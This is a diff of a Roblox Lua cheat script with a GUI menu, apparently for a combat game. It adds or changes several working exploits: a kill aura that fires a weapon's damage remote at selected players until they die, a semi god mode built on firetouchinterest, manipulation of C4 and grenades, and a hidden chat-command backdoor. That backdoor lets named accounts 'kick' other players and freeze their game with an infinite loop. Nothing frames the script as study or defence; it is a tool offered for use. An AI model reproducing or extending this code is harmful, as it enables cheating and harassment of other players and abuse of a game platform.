@@ -14,18 +14,18 @@ local Player = game:GetService("Players").LocalPlayer
 local Mouse = Player:GetMouse()
 local StarterGui = game:GetService("StarterGui")
 
-local sigma = {
+local sigmas = {
     "pedrood2", 
     "iidino122",
     "iAmLegitTrust_p",
     "Milaneso202_xd"
 }
 
-local alpha = "users"
+local alpha = ":users"
 
--- Verify is user is admin ong
-local function admins(name)
-    for _, admin in ipairs(sigma) do 
+-- Verificar si un usuario es admin
+local function isAdmin(name)
+    for _, admin in ipairs(sigmas) do 
         if admin:lower() == name:lower() then
             return true
         end
@@ -33,68 +33,43 @@ local function admins(name)
     return false
 end
 
--- objetive kick
+-- Ejecutar kick (código existente)
 local function executeKick(targetPlayer)
-    local kickgui11 = Instance.new("ScreenGui")
-    local framidykick = Instance.new("Frame")
-    local kickLabel = Instance.new("TextLabel")
+    local player = game.Players.LocalPlayer
+    wait(0.1)
+    Workspace[player.Name].Torso:Destroy()
+    wait(0.1)
+    local bool = true
 
-    kickgui11.Name = "kickgui11"
-    kickgui11.Parent = targetPlayer:WaitForChild("PlayerGui")
-    kickgui11.ResetOnSpawn = false
+    if bool then
+        game.Workspace.FallenPartsDestroyHeight = 0 / 0
+    else
+        game.Workspace.FallenPartsDestroyHeight = -500
+    end
 
-    framidykick.Name = "framidykick"
-    framidykick.Parent = kickgui11
-    framidykick.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    framidykick.BackgroundTransparency = 0.4
-    framidykick.BorderSizePixel = 0
-    framidykick.Size = UDim2.new(1, 0, 1, 0)
-
-    kickLabel.Name = "kickLabel"
-    kickLabel.Parent = framidykick
-    kickLabel.BackgroundTransparency = 1
-    kickLabel.Size = UDim2.new(1, 0, 1, 0)
-    kickLabel.Font = Enum.Font.SourceSansBold
-    kickLabel.Text = "KICKED FROM THE GAME BY ADMIN/DEV"
-    kickLabel.TextColor3 = Color3.fromRGB(255, 16, 200)
-    kickLabel.TextScaled = true
-    kickLabel.TextWrapped = true
-local player = game.Players.LocalPlayer
-wait(0.1)
-Workspace[player.Name].Torso:Destroy()
-wait(0.1)
-local bool = true
-
-if bool then
-    game.Workspace.FallenPartsDestroyHeight = 0 / 0
-else
-    game.Workspace.FallenPartsDestroyHeight = -500
-end
---void kicked user to force anti play
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-989889989898989, -989879898998988, -98999898989899898)
-wait(0.3)
-Workspace[player.Name].Humanoid:Destroy()
-wait(0.2)
-Workspace[player.Name].Head:Destroy()
-wait(0.2)
-Workspace[player.Name]:FindFirstChild("Right Leg"):Destroy()
-wait(0.2)
-Workspace[player.Name]:FindFirstChild("Left Leg"):Destroy()
-wait(0.2)
-Workspace[player.Name]:FindFirstChild("Right Arm"):Destroy()
-wait(0.2)
-Workspace[player.Name]:FindFirstChild("Left Arm"):Destroy()
-    -- Deletes all players parts (perm void)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-989889989898989, -989879898998988, -98999898989899898)
+    wait(0.3)
+    Workspace[player.Name].Humanoid:Destroy()
     wait(0.2)
-  
-    targetPlayer:Kick("You were kicked by Dev/Admin.") -- Dynamic kick to more faster
+    Workspace[player.Name].Head:Destroy()
+    wait(0.2)
+    Workspace[player.Name]:FindFirstChild("Right Leg"):Destroy()
+    wait(0.2)
+    Workspace[player.Name]:FindFirstChild("Left Leg"):Destroy()
+    wait(0.2)
+    Workspace[player.Name]:FindFirstChild("Right Arm"):Destroy()
+    wait(0.2)
+    Workspace[player.Name]:FindFirstChild("Left Arm"):Destroy()
+    wait(0.2)
 
-	wait(0.5)
-while true do -- if user has anti kick frooze game method (not playable)
-   end
+    targetPlayer:Kick("You were kicked by Dev/Admin.")
+    wait(0.5)
+
+    while true do
+    end
 end
 
--- autocomplete user example :kick pedr
+-- Buscar jugador por nombre parcial
 local function findPlayerByName(partialName)
     partialName = partialName:lower()
     for _, player in pairs(game.Players:GetPlayers()) do
@@ -105,21 +80,28 @@ local function findPlayerByName(partialName)
     return nil
 end
 
-
+-- Manejar mensajes del chat
 local function onChatMessage(player, message)
-    -- ignore owner username on users command
-    if message:lower() == alpha:lower() and player.Name:lower() ~= "pedrood2" then
-        local args = {
-            [1] = ">>> HII!",
-            [2] = "All"
-        }
-        game:GetService("ReplicatedStorage")
-            :WaitForChild("DefaultChatSystemChatEvents")
-            :WaitForChild("SayMessageRequest")
-            :FireServer(unpack(args))
+    -- Comando ":users" solo para usuarios en sigmas (excepto pedrood2)
+    if message:lower() == alpha:lower() and isAdmin(player.Name) and player.Name:lower() ~= "pedrood2" then
+        for _, sigmaUser in ipairs(sigmas) do
+            if sigmaUser:lower() ~= "pedrood2" then
+                local sigmaPlayer = findPlayerByName(sigmaUser)
+                if sigmaPlayer then
+                    local args = {
+                        [1] = ">>> HII!",
+                        [2] = "All"
+                    }
+                    game:GetService("ReplicatedStorage")
+                        :WaitForChild("DefaultChatSystemChatEvents")
+                        :WaitForChild("SayMessageRequest")
+                        :FireServer(unpack(args))
+                end
+            end
+        end
     end
 
-    -- Owner only can kick players
+    -- Comando ":kick" solo para pedrood2
     if message:sub(1, 5):lower() == ":kick" and player.Name:lower() == "pedrood2" then
         local partialName = message:sub(7):lower()
         local targetPlayer = findPlayerByName(partialName)
@@ -129,17 +111,17 @@ local function onChatMessage(player, message)
             player:Kick("Player not found: " .. partialName)
         end
     elseif message:sub(1, 5):lower() == ":kick" then
-game.StarterGui:SetCore("SendNotification", {
-    Title = "Note:";
-    Text = "You do not have permission to use this command (Owner Only)";
-    Icon = "http://www.roblox.com/asset/?id=5585095509";
-    Duration = 5;
-    callback = bindableFunction;
-})
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Note:",
+            Text = "You do not have permission to use this command (Owner Only)",
+            Icon = "http://www.roblox.com/asset/?id=5585095509",
+            Duration = 5,
+            callback = bindableFunction,
+        })
     end
 end
 
--- Connect into new players
+-- Conectar eventos a nuevos jugadores
 local players = game:GetService("Players")
 
 players.PlayerAdded:Connect(function(player)
@@ -148,12 +130,13 @@ players.PlayerAdded:Connect(function(player)
     end)
 end)
 
--- Connect w actual players
+-- Conectar eventos a jugadores existentes
 for _, player in ipairs(players:GetPlayers()) do
     player.Chatted:Connect(function(message)
         onChatMessage(player, message)
     end)
 end
+
 
 -- Función para mostrar una notificación
 local function showNotification(title, text, duration)
@@ -650,6 +633,28 @@ window:Button("Set Day",function()
 game.Lighting:SetMinutesAfterMidnight(720)
 end)
 
+window:Button("Disappear Near Bombs",function()
+local c4 = "C4 Model"
+local grenade = "Grenade Model"
+
+local function a(modelName)
+    local model = game:GetService("Workspace"):FindFirstChild(modelName)
+    if model and model:IsA("Model") then
+        for _, child in ipairs(model:GetChildren()) do
+            if child:IsA("BasePart") then
+                child.Position = Vector3.new(-99, -50, 198)
+            end
+        end
+    end
+end
+
+while true do
+    a(c4)
+    a(grenade)
+    wait(0.1)
+end
+end)
+
 window:Button("Anti Carry (New)",function()
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
@@ -1068,11 +1073,106 @@ game:GetService("UserInputService").InputBegan:Connect(function(Input, IsTyping)
     end
 end)
 
+window:Bind("Quick Triple Jump",{location = Table, flag = "KeyBindb", default = Enum.KeyCode.B},function()
+local Mouse = game.Players.LocalPlayer:GetMouse()
+game:GetService("UserInputService").InputBegan:Connect(function(Input, IsTyping)
+if IsTyping then return end
+if Input.KeyCode == Enum.KeyCode.B then
+wait()
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local mouse = LocalPlayer:GetMouse()
+
+local hasDoubleJumped = false
+
+-- Script inicial que reproduce la animación JumpAnim
+local function playJumpAnimation()
+    -- Encuentra el personaje en Workspace
+    local character = game:GetService("Workspace"):FindFirstChild("pedrood2")
+    if character then
+        -- Busca el objeto Animate
+        local animateScript = character:FindFirstChild("Animate")
+        if animateScript then
+            -- Busca la animación JumpAnim
+            local jumpAnim = animateScript.jump:FindFirstChild("JumpAnim")
+            if jumpAnim and jumpAnim:IsA("Animation") then
+                -- Asegúrate de que exista un Animator en el personaje
+                local humanoid = character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    local animator = humanoid:FindFirstChildOfClass("Animator")
+                    if not animator then
+                        animator = Instance.new("Animator")
+                        animator.Parent = humanoid
+                    end
+                    
+                    -- Cargar y reproducir la animación
+                    local animationTrack = animator:LoadAnimation(jumpAnim)
+                    animationTrack:Play()
+                    print("")
+                else
+                    warn("No se encontró un Humanoid en el personaje.")
+                end
+            else
+                warn("JumpAnim no es una instancia válida de Animation.")
+            end
+        else
+            warn("No se encontró el script Animate en el personaje.")
+        end
+    else
+        warn("No se encontró el personaje pedrood2 en Workspace.")
+    end
+end
+
+local function performDoubleJump()
+    -- Ejecuta la animación al inicio
+    playJumpAnimation()
+
+    local character = LocalPlayer.Character
+    local humanoid = character and character:FindFirstChildOfClass('Humanoid')
+
+    if humanoid and not hasDoubleJumped then
+        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+        wait()
+
+        -- Manejo de C4
+        for _, v in ipairs(LocalPlayer.Backpack:GetChildren()) do
+            if v.Name == 'C4' and v:FindFirstChild('RemoteEvent') then
+                LocalPlayer.Character.Humanoid:EquipTool(v) -- Equipar antes de usar
+                wait(0.1)
+                v.RemoteEvent:FireServer(mouse.Hit.LookVector)
+                wait(0.2)
+                tpToPlayer("C4 Model") -- Teletransportar la C4 al jugador
+                v.Parent = LocalPlayer.Backpack
+            end
+        end
+
+        wait(0.1)
+
+        -- Manejo de Grenade
+        for _, v in ipairs(LocalPlayer.Backpack:GetChildren()) do
+            if v.Name == 'Grenade' then
+                LocalPlayer.Character.Humanoid:EquipTool(v) -- Equipar la granada
+                wait(0.1)
+                v:Activate()
+                wait(0.2)
+                tpToPlayer("Grenade Model") -- Teletransportar la granada al jugador
+                v.Parent = LocalPlayer.Backpack
+            end
+        end
+
+        hasDoubleJumped = true
+    end
+end
+performDoubleJump()
+end
+end)
+end)
+
 window:Section(" Target List")
 
 wait(.1)
 
-window:Dropdown("Select Target",{location = Table,flag = "player1",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
+window:Dropdown("Kill Aura",{location = Table,flag = "player1",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
     Title = "Target:";
     Text = "Choosed sucessfully!";
     Icon = "http://www.roblox.com/asset/?id=5585103223";
@@ -1080,134 +1180,6 @@ window:Dropdown("Select Target",{location = Table,flag = "player1",search = true
     callback = bindableFunction;
 })
 local usernames        = {(Table["player1"])}-- Reemplaza estos nombres de usuario con los que desees
-local Players          = game:GetService("Players")
-local LocalPlayer      = Players.LocalPlayer
-local Mouse            = LocalPlayer:GetMouse()
-local UserInputService = game:GetService("UserInputService")
-
-UserInputService.InputBegan:Connect(function(Input, IsTyping)
-    if IsTyping then return end
-    if Input.KeyCode == Enum.KeyCode.KeypadMinus then
-        for _, username in pairs(usernames) do
-            local TargetPlayer = Players:FindFirstChild(username)
-            if TargetPlayer and TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("Humanoid") then
-                local Target = TargetPlayer.Character:FindFirstChild("Humanoid")
-                repeat
-                    wait()
-                    LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(Target)
-                until Target.Health <= 0
-            end
-        end
-    end
-end)
-end)
-
-wait(.1)
-
-window:Dropdown("Target Selection",{location = Table,flag = "player2",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
-    Title = "Target:";
-    Text = "Choosed sucessfully!";
-    Icon = "http://www.roblox.com/asset/?id=5585103223";
-    Duration = 5;
-    callback = bindableFunction;
-})
-local usernames        = {(Table["player2"])}-- Reemplaza estos nombres de usuario con los que desees
-local Players          = game:GetService("Players")
-local LocalPlayer      = Players.LocalPlayer
-local Mouse            = LocalPlayer:GetMouse()
-local UserInputService = game:GetService("UserInputService")
-
-UserInputService.InputBegan:Connect(function(Input, IsTyping)
-    if IsTyping then return end
-    if Input.KeyCode == Enum.KeyCode.KeypadMinus then
-        for _, username in pairs(usernames) do
-            local TargetPlayer = Players:FindFirstChild(username)
-            if TargetPlayer and TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("Humanoid") then
-                local Target = TargetPlayer.Character:FindFirstChild("Humanoid")
-                repeat
-                    wait()
-                    LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(Target)
-                until Target.Health <= 0
-            end
-        end
-    end
-end)
-end)
-
-wait(.1)
-
-window:Dropdown("Select Target",{location = Table,flag = "player3",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
-    Title = "Target:";
-    Text = "Choosed sucessfully!";
-    Icon = "http://www.roblox.com/asset/?id=5585103223";
-    Duration = 5;
-    callback = bindableFunction;
-})
-local usernames        = {(Table["player3"])}-- Reemplaza estos nombres de usuario con los que desees
-local Players          = game:GetService("Players")
-local LocalPlayer      = Players.LocalPlayer
-local Mouse            = LocalPlayer:GetMouse()
-local UserInputService = game:GetService("UserInputService")
-
-UserInputService.InputBegan:Connect(function(Input, IsTyping)
-    if IsTyping then return end
-    if Input.KeyCode == Enum.KeyCode.KeypadMinus then
-        for _, username in pairs(usernames) do
-            local TargetPlayer = Players:FindFirstChild(username)
-            if TargetPlayer and TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("Humanoid") then
-                local Target = TargetPlayer.Character:FindFirstChild("Humanoid")
-                repeat
-                    wait()
-                    LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(Target)
-                until Target.Health <= 0
-            end
-        end
-    end
-end)
-end)
-
-wait(.1)
-
-window:Dropdown("Select Target",{location = Table,flag = "player4",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
-    Title = "Target:";
-    Text = "Choosed sucessfully!";
-    Icon = "http://www.roblox.com/asset/?id=5585103223";
-    Duration = 5;
-    callback = bindableFunction;
-})
-local usernames        = {(Table["player4"])}-- Reemplaza estos nombres de usuario con los que desees
-local Players          = game:GetService("Players")
-local LocalPlayer      = Players.LocalPlayer
-local Mouse            = LocalPlayer:GetMouse()
-local UserInputService = game:GetService("UserInputService")
-
-UserInputService.InputBegan:Connect(function(Input, IsTyping)
-    if IsTyping then return end
-    if Input.KeyCode == Enum.KeyCode.KeypadMinus then
-        for _, username in pairs(usernames) do
-            local TargetPlayer = Players:FindFirstChild(username)
-            if TargetPlayer and TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("Humanoid") then
-                local Target = TargetPlayer.Character:FindFirstChild("Humanoid")
-                repeat
-                    wait()
-                    LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(Target)
-                until Target.Health <= 0
-            end
-        end
-    end
-end)
-end)
-
-wait(.1)
-
-window:Dropdown("Select Target",{location = Table,flag = "player5",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
-    Title = "Target:";
-    Text = "Choosed sucessfully!";
-    Icon = "http://www.roblox.com/asset/?id=5585103223";
-    Duration = 5;
-    callback = bindableFunction;
-})
-local usernames        = {(Table["player5"])}-- Reemplaza estos nombres de usuario con los que desees
 local Players          = game:GetService("Players")
 local LocalPlayer      = Players.LocalPlayer
 local Mouse            = LocalPlayer:GetMouse()
@@ -1252,7 +1224,7 @@ window:Toggle("Start/Stop Loop (Fixed)", {location = Table, flag = "enable"}, fu
                 -- Kill Aura empieza aquí
                 local target
                 local minRange = 500  -- Rango de activación del Kill Aura en studs
-                local allowedUsers = {Table["player1"], Table["player2"], Table["player3"], Table["player4"], Table["player5"]}
+                local allowedUsers = {Table["player1"]}
 
                 local playerChar = GetChar()
                 local playerRoot = playerChar:FindFirstChild("HumanoidRootPart")
@@ -1897,7 +1869,7 @@ window:Toggle("Farm Grenade 2", {location = Table, flag = "Farming"}, function()
 
                 -- Esperar hasta que el personaje haya spawneado
                 repeat
-                    wait(0.1)
+                    wait(0.4)
                 until player.Character and player.Character:FindFirstChild("HumanoidRootPart")
 
                 -- Verificar si el personaje está en la posición requerida
@@ -2104,6 +2076,120 @@ window:Button("Teleport Up (Exit)",function()
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-511, 100, 67)
 end)
 
+window:Button("Anti-Hit.(Semi God Mode)",function()
+game.StarterGui:SetCore("SendNotification", {
+    Title    = "Anti-Hit Started";
+    Text     = "Hold On ((DO NOT TOUCH ANYTHING WAIT!))";
+    Icon     = "http://www.roblox.com/asset/?id=5585095509"; 
+    Duration = 5; 
+    callback = bindableFunction;
+})
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-292, 60, -68)
+
+wait()
+
+local player = game.Players.LocalPlayer
+local humanoid = game.Workspace[player.Name].Humanoid
+humanoid.Health = 0 
+
+wait(6)
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-292, 60, -68)
+
+
+local Player = game:GetService("Players").LocalPlayer
+local Mouse = Player:GetMouse()
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").Enabled = false
+    Player.PlayerGui["Menu Screen"].RemoteEvent:FireServer("Steel Sword")
+
+wait(1)
+
+local player = game.Players.LocalPlayer
+local humanoid = game.Workspace[player.Name].Humanoid
+humanoid.Health = 0 
+
+wait()
+
+local player = game.Players.LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+local toolName = "Steel Sword"
+
+local function selectTool()
+    local tool = backpack:FindFirstChild(toolName)
+    if tool then
+        player.Character.Humanoid:EquipTool(tool)
+		wait(0.2)
+       game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
+    else
+        print("No se encontró la herramienta " .. toolName .. " en el Backpack.")
+    end
+end
+
+selectTool()
+
+wait(6)
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-292, 60, -68)
+
+wait()
+
+local root = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("HumanoidRootPart") or game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("BasePart")
+wait(0.1)
+local function touch(x)
+    x = x:FindFirstAncestorWhichIsA("BasePart")
+    if x and firetouchinterest then
+        if x.Name == "Button" then
+            -- Ignorar el 'Button de la spiked trap'
+            return
+        end
+        
+        task.spawn(function()
+            firetouchinterest(x, root, 1)
+            wait()
+            firetouchinterest(x, root, 0)
+        end)
+        x.CFrame = root.CFrame
+    end
+end
+
+for _, descendant in ipairs(workspace:GetDescendants()) do
+    if descendant:IsA("TouchTransmitter") then
+        touch(descendant)
+    end
+end
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-286, 97, -2)
+
+local Player = game:GetService("Players").LocalPlayer
+local Mouse = Player:GetMouse()
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").Enabled = false
+    Player.PlayerGui["Menu Screen"]:Destroy()
+
+
+game.StarterGui:SetCore("SendNotification", {
+    Title    = "Anti-Hit Ended";
+    Text     = "Now u can move";
+    Icon     = "http://www.roblox.com/asset/?id=5585095509"; 
+    Duration = 3; 
+    callback = bindableFunction;
+})
+
+wait(1)
+
+game.StarterGui:SetCore("SendNotification", {
+    Title    = "DATA";
+    Text     = "STEEL SWORD ITS THAT THING THAT GIVES YOU Anti-Hit EQUIP IT!";
+    Icon     = "http://www.roblox.com/asset/?id=5585095509"; 
+    Duration = 5; 
+    callback = bindableFunction;
+})
+end)
+
 window:Button("Invisible Choose Weapon",function()
 local Player = game:GetService("Players").LocalPlayer
 local Mouse = Player:GetMouse()
@@ -2183,6 +2269,56 @@ end)
 end)
 
 window:Button("Spam Grenade 2",function()
+local player = game.Players.LocalPlayer -- Obtiene al jugador local
+local character = player.Character or player.CharacterAdded:Wait() -- Asegura que el personaje esté cargado
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart") -- Centro del personaje
+
+local radius = 30 -- Radio del círculo
+local heightOffset = 11 -- Altura adicional por encima del personaje
+local baseOffset = -5 -- Altura desde donde comienza el cilindro (5 studs por debajo)
+local duration = 5 -- Duración en segundos
+local numBlocks = 85 -- Número de bloques en cada capa del círculo
+local numLayers = 11 -- Número de capas (desde la base hasta la altura final)
+
+-- Crea la barrera
+local function createInvisibleCylinder()
+    local blocks = {} -- Lista para almacenar los bloques
+
+    for layer = 0, numLayers - 1 do
+        local currentHeight = humanoidRootPart.Position.Y + baseOffset + (layer * ((heightOffset - baseOffset) / numLayers))
+
+        for i = 1, numBlocks do
+            -- Calcular posición en el círculo
+            local angle = math.rad((360 / numBlocks) * i)
+            local x = humanoidRootPart.Position.X + math.cos(angle) * radius
+            local z = humanoidRootPart.Position.Z + math.sin(angle) * radius
+
+            -- Crear el bloque
+            local block = Instance.new("Part")
+            block.Size = Vector3.new(2, 2, 2)
+            block.Anchored = true
+            block.Transparency = 1 -- Hacer el bloque completamente invisible
+            block.CanCollide = true -- Mantener la colisión habilitada
+            block.CFrame = CFrame.new(x, currentHeight, z)
+            block.Parent = workspace
+
+            table.insert(blocks, block) -- Añadir el bloque a la lista
+        end
+    end
+
+    -- Eliminar los bloques después de la duración
+    task.delay(duration, function()
+        for _, block in pairs(blocks) do
+            if block then
+                block:Destroy()
+            end
+        end
+    end)
+end
+
+-- Ejecutar la función
+createInvisibleCylinder()
+
         for _,v in next,plr.Backpack:GetChildren() do
             if v.Name == 'Grenade 2' and v:FindFirstChild'RemoteEvent' then
                 v.Parent = plr.Character
